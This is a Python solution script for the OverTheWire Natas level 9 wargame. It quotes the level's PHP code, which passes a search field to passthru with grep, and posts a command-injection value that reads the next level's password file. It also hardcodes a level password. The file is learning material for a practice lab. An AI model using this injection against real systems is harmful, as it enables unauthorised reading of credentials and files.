#!/usr/bin/env python

#using requests module for python, not sure if I will need to install anything for this?
import requests
import re

username = 'natas9'
password = 'Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd'
url = 'http://%s.natas.labs.overthewire.org/' % username
#print(url) #make sure the URL works fine

session = requests.Session()

#there's a search on the page that returns and word containing an example
#Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
#Output:
#$key = "";
#if(array_key_exists("needle", $_REQUEST)) {
#    $key = $_REQUEST["needle"];
#}
#if($key != "") {
#    passthru("grep -i $key dictionary.txt");
#}
#I thought that maybe needle was important but putting that in there doesn't reveal anything, moving to video
#tried this:
#response = requests.post(url, data = {"needle": "natas", "submit" : "submit"}, auth = (username, password))

#so turns out that passthru is a php function and we can just send stuff to it and possibly do remote code execution
response = requests.post(url, data = {"needle": ". /etc/natas_webpass/natas10 #", "submit" : "submit"}, auth = (username, password))

#response = requests.get(url, auth = (username, password))
content = response.text


######################
#print(content)

#classic regexing
print(re.findall('Output:\n<pre>\n(.*)\n</pre>', content))